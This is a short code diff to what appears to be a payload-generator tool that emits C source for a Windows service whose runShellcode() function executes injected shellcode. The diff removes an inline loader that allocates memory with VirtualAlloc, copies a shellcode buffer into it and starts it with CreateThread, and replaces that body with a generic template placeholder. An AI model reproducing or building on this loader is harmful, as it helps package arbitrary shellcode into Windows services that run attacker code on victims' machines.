@@ -22,7 +22,6 @@ class service:
         return Template("""
 {imports}
 
-
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE ServiceStatusHandle;
 
@@ -46,16 +45,7 @@ void ServiceControlHandler(DWORD control) {{
 
 void runShellcode(){{
 
-    
-    {transformers}
-
-    LPVOID buffer = NULL;
-    HANDLE hThread = NULL;
-    
-    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
-    memcpy(buffer, shellcode, {shellcodeSize});
-    
-    hThread = CreateThread(NULL, 0, buffer, NULL, 0, NULL);
+	{template}
 
 }}
 
